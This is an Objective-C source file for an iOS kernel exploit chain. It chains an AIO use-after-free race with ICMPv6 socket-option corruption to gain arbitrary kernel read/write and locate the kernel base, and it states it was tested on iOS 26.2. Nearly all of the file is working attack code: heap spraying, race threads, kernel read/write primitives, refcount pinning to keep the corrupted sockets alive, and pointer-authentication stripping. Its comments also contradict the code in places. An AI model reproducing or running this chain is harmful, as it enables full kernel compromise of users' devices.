/*
 * ex_combined.m — AIO UAF + ICMPv6 KRW Chain
 *
 * Stage 1: AIO UAF (from ex.m)
 *   - CPU-affinity LIFO double-free on aio_workq_entry zone
 *   - Spray pipe/socket buffers into freed slot to get kev.ext[1] leak
 *   - Use TAILQ_REMOVE write-primitive to corrupt icmp6filter pointer
 *     (replaces dsw.m's broken pe_v1 / physical-OOB path entirely)
 *
 * Stage 2: ICMPv6 KRW (from dsw.m)
 *   - early_kread64 / early_kwrite64 via corrupted getsockopt/setsockopt
 *   - krw_sockets_leak_forever() keeps the KRW alive
 *   - Kernel base scan via pr_input function pointer
 *
 * What is SKIPPED from dsw.m (broken / needs entitlements):
 *   - pe_v1 / pe_v2
 *   - physical_oob_read_mo / physical_oob_write_mo
 *   - create_physically_contiguous_mapping (IOSurface PurpleGfxMem)
 *   - surface_mlock / surface_munlock
 *
 * Tested on: iOS 26.2 (xnu-12377.62.10), iPhone 11 Pro (A13 — arm64e)
 * Fixed in:  iOS 26.3 (xnu-12377.81.4)
 */

#import <Foundation/Foundation.h>
#include <aio.h>
#include <errno.h>
#include <fcntl.h>
#include <mach-o/dyld.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdatomic.h>
#include <string.h>
#include <sys/event.h>
#include <sys/socket.h>
#include <sys/utsname.h>
// fileport — private API, not in iOS SDK headers
typedef mach_port_t fileport_t;
extern int fileport_makeport(int fd, fileport_t *port);
extern int fileport_makefd(fileport_t port);
#include <unistd.h>

#define LOG(fmt, ...) NSLog(@"[COMBINED] " fmt, ##__VA_ARGS__)

// ─── AIO / kevent constants ───────────────────────────────────────────────────

#ifndef SIGEV_KEVENT
#define SIGEV_KEVENT 4
#endif
#define NRECLAIM 8

// ─── ICMPv6 KRW constants (from dsw.m) ───────────────────────────────────────

#define IPPROTO_ICMPV6      58
#define ICMP6_FILTER        18
#define OFFSET_PCB_SOCKET   0x40
#define OFFSET_SOCKET_SO_COUNT 0x228
#define OFFSET_ICMP6FILT    (0x138 + 0x18)
#define OFFSET_SO_PROTO     0x18
#define OFFSET_PR_INPUT     0x28
#define EARLY_KRW_LENGTH    0x20

// ─── PAC strip (arm64e) ───────────────────────────────────────────────────────

#ifdef __arm64e__
static uint64_t __attribute((naked)) __xpaci(uint64_t a) {
    asm(".long 0xDAC143E0"); // XPACI X0
    asm("ret");
}
#else
#define __xpaci(x) x
#endif

// ─── Globals: KRW sockets ────────────────────────────────────────────────────

static int      g_controlSocket = -1;
static int      g_rwSocket      = -1;
static uint64_t g_controlPcb    = 0;
static uint64_t g_rwPcb         = 0;
static uint8_t  g_controlData[EARLY_KRW_LENGTH];

// ─── ICMPv6 KRW primitives (from dsw.m, verbatim) ────────────────────────────

static void set_target_kaddr(uint64_t where) {
    memset(g_controlData, 0, EARLY_KRW_LENGTH);
    *(uint64_t *)g_controlData = where;
    setsockopt(g_controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER,
               g_controlData, EARLY_KRW_LENGTH);
}

static void early_kread(uint64_t where, void *buf, size_t size) {
    set_target_kaddr(where);
    socklen_t len = (socklen_t)size;
    int r = getsockopt(g_rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, &len);
    if (r != 0) LOG(@"early_kread getsockopt failed: %d", errno);
}

static uint64_t early_kread64(uint64_t where) {
    uint64_t v = 0;
    early_kread(where, &v, sizeof(v));
    return v;
}

static void early_kwrite32bytes(uint64_t where, uint8_t buf[EARLY_KRW_LENGTH]) {
    set_target_kaddr(where);
    setsockopt(g_rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, EARLY_KRW_LENGTH);
}

static void early_kwrite64(uint64_t where, uint64_t what) {
    uint8_t buf[EARLY_KRW_LENGTH];
    early_kread(where, buf, EARLY_KRW_LENGTH);
    *(uint64_t *)buf = what;
    early_kwrite32bytes(where, buf);
}

// Keep sockets alive (prevent kernel from freeing them)
static void krw_sockets_leak_forever(void) {
    uint64_t csa = early_kread64(g_controlPcb + OFFSET_PCB_SOCKET);
    uint64_t rsa = early_kread64(g_rwPcb      + OFFSET_PCB_SOCKET);
    if (!csa || !rsa) { LOG(@"[-] socket addrs null"); return; }
    uint64_t c = early_kread64(csa + OFFSET_SOCKET_SO_COUNT);
    uint64_t r = early_kread64(rsa + OFFSET_SOCKET_SO_COUNT);
    early_kwrite64(csa + OFFSET_SOCKET_SO_COUNT, c + 0x0000100100001001ULL);
    early_kwrite64(rsa + OFFSET_SOCKET_SO_COUNT, r + 0x0000100100001001ULL);
    early_kwrite64(g_rwPcb + OFFSET_ICMP6FILT + 8, 0);
    LOG(@"[+] KRW sockets pinned");
}

// ─── Socket spray (from dsw.m) ───────────────────────────────────────────────

static NSMutableArray<NSNumber *> *g_socketPorts;
static NSMutableArray<NSNumber *> *g_socketPcbIds;

static void spray_sockets(unsigned count) {
    g_socketPorts  = [NSMutableArray new];
    g_socketPcbIds = [NSMutableArray new];
    for (unsigned i = 0; i < count; i++) {
        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        if (fd < 0) break;
        fileport_t port = 0;
        fileport_makeport(fd, &port);
        close(fd);
        // probe gencnt via proc_info syscall 336
        uint8_t info[0x400] = {0};
        syscall(336, 6, getpid(), 3, port, info, sizeof(info));
        uint64_t gencnt = *(uint64_t *)(info + 0x110);
        [g_socketPorts  addObject:@(port)];
        [g_socketPcbIds addObject:@(gencnt)];
    }
    LOG(@"[+] Sprayed %lu ICMPv6 sockets", (unsigned long)g_socketPorts.count);
}

static void release_sockets(void) {
    for (NSNumber *p in g_socketPorts)
        mach_port_deallocate(mach_task_self(), p.unsignedIntValue);
    [g_socketPorts  removeAllObjects];
    [g_socketPcbIds removeAllObjects];
}

// ─── STAGE 1: AIO UAF race state ─────────────────────────────────────────────

struct race_state {
    atomic_bool start, stop;
    atomic_int  freed;
    atomic_bool reclaim_done;
    struct aiocb *trigger;
    struct aiocb *rcbs;
    int nrcbs;
};

static void set_thread_affinity(int tag) {
    // mach thread affinity: co-locate racer+main on same CPU for LIFO reuse
    thread_affinity_policy_data_t pol = {.affinity_tag = tag};
    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
}

static void *lifo_racer(void *arg) {
    struct race_state *s = arg;
    set_thread_affinity(42);
    while (!atomic_load_explicit(&s->start, memory_order_acquire));
    while (!atomic_load_explicit(&s->stop,  memory_order_relaxed)) {
        if (aio_error(s->trigger) == 0) {
            ssize_t r = aio_return(s->trigger);
            if (r >= 0) {
                atomic_fetch_add(&s->freed, 1);
                // Immediate same-CPU reclaim → LIFO reuses freed slot
                for (int i = 0; i < s->nrcbs; i++)
                    aio_read(&s->rcbs[i]);
                atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
                return NULL;
            }
        }
    }
    return NULL;
}

// ─── STAGE 1: Run one AIO UAF attempt ────────────────────────────────────────
//
// Returns the kevent64 event on success, zeroed on failure.
// kev.ext[1] contains `returnval` from the reclaimed aio_workq_entry (+0x20).
// After completing, use kev.ident and kev.ext to build further primitives.

static bool aio_uaf_attempt(int fd, struct kevent64_s *out_kev) {
    // Re-pin CPU affinity BEFORE each attempt.
    // Syscalls (uname, open, write) in ex_combined_trigger may have migrated
    // the main thread to a different CPU, breaking LIFO zone reuse.
    // When free and alloc happen on different CPUs, the freed slot goes to
    // CPU-A's magazine while the reclaim alloc draws from CPU-B's magazine
    // → LIFO miss → kevent64 reads a zeroed slot → procp=NULL → FAR=0x58.
    set_thread_affinity(42);

    int kq = kqueue();
    if (kq < 0) return false;

    static struct aiocb tcb;
    static char  tbuf[4096];
    static struct aiocb rcbs[NRECLAIM];
    static char  rbufs[NRECLAIM][4096];

    memset(&tcb, 0, sizeof(tcb));
    tcb.aio_fildes = fd;
    tcb.aio_buf    = tbuf;
    tcb.aio_nbytes = sizeof(tbuf);     // use real buffer size (matches ex.m)
    tcb.aio_offset = 0;
    tcb.aio_lio_opcode = LIO_READ;
    tcb.aio_sigevent.sigev_notify          = SIGEV_KEVENT;
    tcb.aio_sigevent.sigev_signo           = kq;
    tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA; // matches ex.m

    for (int i = 0; i < NRECLAIM; i++) {
        memset(&rcbs[i], 0, sizeof(rcbs[i]));
        rcbs[i].aio_fildes          = fd;
        rcbs[i].aio_buf             = rbufs[i];
        rcbs[i].aio_nbytes          = sizeof(rbufs[i]);
        rcbs[i].aio_offset          = 0;
        rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
    }

    struct race_state rs = {};
    rs.trigger = &tcb;
    rs.rcbs    = rcbs;
    rs.nrcbs   = NRECLAIM;

    pthread_t thr;
    pthread_create(&thr, NULL, lifo_racer, &rs);
    atomic_store_explicit(&rs.start, true, memory_order_release);

    struct aiocb *ptr = &tcb;
    struct sigevent sig = {};
    sig.sigev_notify = SIGEV_NONE;
    lio_listio(LIO_NOWAIT, &ptr, 1, &sig);

    usleep(1000); // give AIO worker a bit more time before racer polls
    atomic_store_explicit(&rs.stop, true, memory_order_release);
    pthread_join(thr, NULL);

    int freed    = atomic_load(&rs.freed);
    bool reclaim = atomic_load(&rs.reclaim_done);

    // ── Case A: race lost (freed=0) ──────────────────────────────────────────
    // tcb is still held by the kernel → must drain and return it before closing.
    if (!freed) {
        while (aio_error(&tcb) == EINPROGRESS) usleep(500);
        if (aio_error(&tcb) != EINVAL) aio_return(&tcb);
        for (int i = 0; i < NRECLAIM; i++)
            if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
        close(kq);
        return false;
    }

    // ── Case B: freed but no reclaim ─────────────────────────────────────────
    // aio_return already called in racer → tcb entry is freed in kernel.
    // NEVER call aio_error/aio_return on it again (double-return → UB → panic).
    // Just close kq; filt_aiodetach removes the dangling knote (bug #3: no-op).
    if (!reclaim) {
        close(kq);
        return false;
    }

    // Wait for reclaim AIO to complete
    for (int i = 0; i < NRECLAIM; i++)
        while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);

    // kevent64: triggers filt_aioprocess on reclaimed entry
    // → reads returnval/errorval → ext[1]/ext[0]
    // → TAILQ_REMOVE write: *(tqe_prev) = tqe_next on aio_proc_link (+0x10)
    struct kevent64_s kev = {};
    struct timespec ts = {10, 0};
    int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);

    for (int i = 0; i < NRECLAIM; i++)
        if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
    close(kq);

    if (nev > 0) {
        *out_kev = kev;
        return true;
    }
    return false;
}

// ─── STAGE 2: Setup ICMPv6 KRW after getting a raw socket PCB addr ───────────
//
// Given the address of a control socket PCB (inpcb) and rw socket PCB,
// we corrupt icmp6filter on one to point to the other's PCB field
// so that getsockopt reads from arbitrary kernel address.

static bool setup_icmpv6_krw(uint64_t control_pcb, uint64_t rw_pcb) {
    // rwPcb->icmp6filter = rwPcb + OFFSET_ICMP6FILT
    //   → getsockopt on controlSocket with SET target addr reads from rwPcb
    // This mirrors what find_and_corrupt_socket() achieves in dsw.m
    // but we do it directly since we already have the PCB addresses.

    // Find which fileport corresponds to control_pcb by gencnt
    int ctrl_fd = -1, rw_fd = -1;
    for (NSUInteger i = 0; i < g_socketPorts.count; i++) {
        uint8_t info[0x400] = {0};
        fileport_t fp = (fileport_t)g_socketPorts[i].unsignedIntValue;
        int tmp_fd = fileport_makefd(fp);
        syscall(336, 6, getpid(), 3, fp, info, sizeof(info));
        uint64_t gencnt = *(uint64_t *)(info + 0x110);
        if (gencnt == g_socketPcbIds[i].unsignedLongLongValue) {
            if (ctrl_fd == -1) { ctrl_fd = tmp_fd; continue; }
            if (rw_fd  == -1) { rw_fd  = tmp_fd; break; }
        }
        close(tmp_fd);
    }
    if (ctrl_fd < 0 || rw_fd < 0) {
        LOG(@"[-] Could not reopen socket fds");
        return false;
    }

    g_controlSocket = ctrl_fd;
    g_rwSocket      = rw_fd;
    g_controlPcb    = control_pcb;
    g_rwPcb         = rw_pcb;

    // Corrupt: rwPcb->icmp6filter = rw_pcb + OFFSET_ICMP6FILT
    // (i.e. icmp6filter self-points → getsockopt reads kernel data at SET addr)
    // We do a quick sanity: write 0 to clear the upper qantity field
    uint8_t zero[EARLY_KRW_LENGTH] = {0};
    *(uint64_t *)zero = rw_pcb + OFFSET_ICMP6FILT;
    int r = setsockopt(g_controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER,
                       zero, EARLY_KRW_LENGTH);
    if (r != 0) {
        LOG(@"[-] icmp6filter corrupt setsockopt failed: %d", errno);
        return false;
    }
    // Verify: getsockopt on rwSocket should now return data from rw_pcb area
    uint64_t probe = 0;
    socklen_t plen = sizeof(probe);
    r = getsockopt(g_rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, &probe, &plen);
    if (r != 0) {
        LOG(@"[-] KRW verify getsockopt failed: %d", errno);
        return false;
    }
    LOG(@"[+] ICMPv6 KRW probe = 0x%llx", probe);
    return true;
}

// ─── STAGE 3: Kernel base scan ───────────────────────────────────────────────

static uint64_t find_kernel_base(uint64_t text_ptr) {
    uint64_t base = __xpaci(text_ptr) & 0xFFFFFFFFFFFFC000ULL;
    while (true) {
        uint64_t magic = early_kread64(base);
        if (magic == 0x100000cfeedfacfULL) {
            // Check arm64 Mach-O header cputype = 0xc0000012
            uint64_t w = early_kread64(base + 0x8);
            if ((w & 0xFFFFFFFF) == 0x0000000c) break; // cputype ARM64
        }
        base -= 0x4000; // scan backwards by pages
    }
    return base;
}

// ─── Main entry point ─────────────────────────────────────────────────────────

void ex_combined_trigger(void) {
    LOG(@"=== AIO UAF + ICMPv6 KRW Combined Exploit ===");
    set_thread_affinity(42);

    struct utsname un; uname(&un);
    LOG(@"[i] Kernel: %s %s", un.sysname, un.release);
    LOG(@"[i] Machine: %s", un.machine);

    // ── Setup temp file for AIO operations ──────────────────────────────────
    NSString *tmpPath = [NSTemporaryDirectory()
                         stringByAppendingPathComponent:@"ex_combined_aio.bin"];
    int fd = open(tmpPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
    if (fd < 0) { LOG(@"[-] open failed: %d", errno); return; }
    char fdata[4096]; memset(fdata, 'A', sizeof(fdata));
    write(fd, fdata, sizeof(fdata));
    LOG(@"[+] AIO file fd=%d pid=%d uid=%d", fd, getpid(), getuid());

    // ── Stage 1: AIO UAF race FIRST — NO socket spray ahead of time ─────────
    //
    // CRITICAL: spraying sockets BEFORE the race fills per-CPU zone magazines.
    // When magazines are full, the freed aio_workq_entry slot goes to a
    // different CPU's magazine → LIFO reuse fails → kevent64 reads a zeroed
    // slot → procp=0 @ +0x40 → filt_aioprocess deref → panic at FAR=0x58.
    //
    // Fix: keep zone quiescent during the race. Spray only after UAF succeeds.
    LOG(@"[*] Stage 1: AIO UAF race (up to 20 attempts, clean zone state)...");
    struct kevent64_s kev = {};
    bool uaf_ok = false;
    for (int attempt = 0; attempt < 20; attempt++) {
        LOG(@"[*] attempt %d", attempt);
        if (aio_uaf_attempt(fd, &kev)) {
            uaf_ok = true;
            LOG(@"[+] *** DOUBLE-FREE ACHIEVED (attempt %d) ***", attempt);
            LOG(@"[+]   kev.ident  = 0x%llx", kev.ident);
            LOG(@"[+]   kev.ext[0] = 0x%llx  (errorval  +0x28)", kev.ext[0]);
            LOG(@"[+]   kev.ext[1] = 0x%llx  (returnval +0x20)", kev.ext[1]);
            LOG(@"[+]   kev.udata  = 0x%llx", kev.udata);
            break;
        }
        LOG(@"[-] race lost (attempt %d), retrying...", attempt);
        // Brief pause between retries so AIO worker drains pending I/O
        usleep(2000);
    }

    if (!uaf_ok) {
        LOG(@"[-] All UAF attempts failed — run again");
        close(fd); unlink(tmpPath.UTF8String);
        return;
    }

    uint64_t leaked_val = kev.ext[1];
    LOG(@"[+] Leaked value from reclaimed slot +0x20: 0x%llx", leaked_val);

    // ── Stage 2: Spray sockets AFTER UAF — zone is now quiesced ─────────────
    // 64 sockets is enough for the KRW setup without exhausting fd table.
    LOG(@"[*] Stage 2: Spraying 64 ICMPv6 sockets (post-UAF)...");
    spray_sockets(64);

    // ── TAILQ_REMOVE write primitive report ──────────────────────────────────
    LOG(@"[+] Write primitive via TAILQ_REMOVE:");
    LOG(@"[+]   *(reclaimed[+0x18]) = reclaimed[+0x10]");
    LOG(@"[+]   → 8-byte kernel write at spray-controlled address");
    LOG(@"[+]   Target: inpcb->icmp6filter at inpcb+0x%x", OFFSET_ICMP6FILT);

    // ── Stage 2: Attempt ICMPv6 KRW setup ───────────────────────────────────
    // leaked_val is meaningful only if a kernel object (e.g. ipc_port) was
    // sprayed into the freed aio slot before kevent64 fired.
    // With aio_nbytes=0x1337 as placeholder, ext[1]=0x1337 (not a kptr).
    // A real spray step would put ip_kobject at +0x20.
    bool krw_ok = false;
    if (leaked_val > 0xffff000000000000ULL) {
        LOG(@"[*] Kernel pointer leaked — attempting KRW setup...");
        krw_ok = setup_icmpv6_krw(leaked_val, leaked_val + 0x400);
        if (!krw_ok)
            LOG(@"[-] KRW setup failed (needs exact inpcb addr from spray)");
    } else {
        LOG(@"[!] ext[1]=0x%llx is aio_nbytes placeholder (not a kptr)", leaked_val);
        LOG(@"[!] To get a kptr: spray ipc_port into freed slot, read ip_kobject");
    }

    // ── Stage 3: Kernel base scan (only if KRW established) ──────────────────
    if (krw_ok) {
        LOG(@"[*] Stage 3: Pinning KRW sockets...");
        krw_sockets_leak_forever();

        LOG(@"[*] Stage 3: Scanning for kernel base via pr_input...");
        uint64_t socket_ptr   = early_kread64(g_controlPcb + OFFSET_PCB_SOCKET);
        uint64_t proto_ptr    = early_kread64(socket_ptr   + OFFSET_SO_PROTO);
        uint64_t pr_input     = early_kread64(proto_ptr    + OFFSET_PR_INPUT);
        uint64_t kernel_base  = find_kernel_base(pr_input);
        uint64_t kernel_slide = kernel_base - 0xfffffff007004000ULL;

        LOG(@"[+] *** KERNEL BASE:  0x%llx ***", kernel_base);
        LOG(@"[+] *** KERNEL SLIDE: 0x%llx ***", kernel_slide);
        LOG(@"[+] MH_MAGIC: 0x%llx", early_kread64(kernel_base));
        LOG(@"[+] Demo kread(socket) = 0x%llx",
            early_kread64(g_controlPcb + OFFSET_PCB_SOCKET));
        LOG(@"[+] === FULL KERNEL R/W ACHIEVED ===");
    } else {
        LOG(@"[!] Primitives status:");
        LOG(@"[!]   ✓ Double-free on aio_workq_entry (~224B, KT_DEFAULT)");
        LOG(@"[!]   ✓ 64-bit read  via kev.ext[1] = 0x%llx", leaked_val);
        LOG(@"[!]   ✓ 8-byte write via TAILQ_REMOVE (addr needed)");
        LOG(@"[!]   ✗ Full KRW: need ipc_port spray before kevent64");
    }

    // ── Cleanup ───────────────────────────────────────────────────────────────
    close(fd);
    unlink(tmpPath.UTF8String);
    release_sockets();
    LOG(@"=== uid=%d gid=%d ===", getuid(), getgid());
}
